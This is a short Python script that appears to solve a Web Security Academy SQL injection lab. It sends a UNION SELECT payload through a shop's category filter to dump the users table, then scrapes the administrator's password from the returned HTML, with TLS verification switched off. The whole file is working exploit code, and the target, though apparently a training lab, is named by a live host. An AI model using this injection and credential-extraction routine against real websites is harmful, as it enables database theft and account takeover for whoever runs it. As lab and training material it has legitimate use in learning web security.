import requests
from bs4 import BeautifulSoup

site = '0a3f00ff042a203fd0ccb59d00ae00cd.web-security-academy.net'

s = requests.Session()

# Step 1: Inject UNION SELECT to retrieve username and password
url = f'https://{site}/filter?category=Gifts%27%20UNION%20SELECT%20username,password%20FROM%20users--'
resp = s.get(url, verify=False)  # ignoring SSL warnings like your earlier steps

# Step 2: Parse the table for administrator password
soup = BeautifulSoup(resp.text, 'html.parser')
user_table = soup.find('table').find_all('tr')

admin_password = None

for row in user_table:
    header = row.find('th')
    data_cells = row.find_all('td')
    if header and 'administrator' in header.text.lower():
        admin_password = data_cells[0].text
        break

# Step 3: Print the result
if admin_password:
    print(f"[+] Administrator password retrieved: {admin_password}")
else:
    print("[-] Administrator password not found.")